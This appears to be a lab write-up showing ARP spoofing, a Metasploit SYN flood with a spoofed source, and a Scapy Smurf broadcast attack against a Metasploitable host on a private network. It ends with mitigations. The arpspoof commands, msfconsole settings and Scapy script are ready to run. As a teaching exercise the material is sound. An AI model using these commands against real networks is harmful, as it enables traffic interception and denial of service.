## 1. ARP Spoofing Attack

### a. Network Configuration

bash

```
# /etc/network/interfaces
auto lo
iface lo inet loopback

auto eth0
iface eth0 inet static
  address 192.168.43.22
  netmask 255.255.255.0
  gateway 192.168.43.1
  dns-nameservers 1.1.1.1 8.8.8.8
```

Each machine is connected to the `192.168.43.0/24` network.

### b. Connectivity Test

bash

```
msfadmin@metasploitable:~$ ping 192.168.43.230
64 bytes from 192.168.43.230: icmp_seq=1 ttl=64 time=5.30 ms
...
```

### c. ARP Table Before Attack

bash

```
msfadmin@metasploitable:~$ arp -a
? (192.168.43.230) at 00:0c:29:14:f1:c7 [ether] on eth0
? (192.168.43.1)   at 00:0c:29:31:55:ad [ether] on eth0
```

### d. Launching ARP Spoofing from Kali

bash

```
sudo arpspoof -t 192.168.43.1 192.168.43.22
sudo arpspoof -t 192.168.43.22 192.168.43.1
```

Result: Kali injects fake ARP replies, poisoning the ARP table.

### e. ARP Table After Attack

bash

```
msfadmin@metasploitable:~$ arp -a
? (192.168.43.1) at 00:0c:29:14:f1:c7 [ether] on eth0
```

## 2. TCP SYN Flooding (DoS)

### a. Launch Metasploit

bash

```
sudo msfconsole
```

### b. Search Module

bash

```
msf6 > search synflood
```

### c. Configure Module

bash

```
msf6 > use auxiliary/dos/tcp/synflood
msf6 > set RHOST 192.168.43.22
msf6 > set RPORT 80
msf6 > set SHOST 184.56.100.250
msf6 > set INTERFACE eth0
msf6 > run
```

### d. Verification with netstat

bash

```
netstat -ant | grep SYN_RECV
```

Shows multiple connections stuck in `SYN_RECV`.

### e. Wireshark Analysis

Captured TCP SYN packets flooding the target.

## 3. Smurf Attack (DDoS)

### a. Launch Scapy

bash

```
sudo scapy
```

### b. ICMP Broadcast Script

python

```
packet = IP(src="192.168.43.22", dst="192.168.43.255")/ICMP()
send(packet, count=100, inter=0.01)
```

Objective: Amplify traffic towards the victim.

### c. Wireshark Analysis

Captured multiple ICMP Echo requests sent to broadcast, confirming attack propagation.

## 📌 Key Takeaways

- **ARP Spoofing**: exploits lack of authentication in ARP.
    
- **SYN Flood**: overloads TCP handshake queue.
    
- **Smurf Attack**: amplifies ICMP traffic via broadcast.
    

### Mitigations

- ARP: Dynamic ARP Inspection, static ARP entries.
    
- SYN Flood: SYN cookies, rate limiting.
    
- Smurf: disable ICMP broadcast, anti-spoofing filters.
    

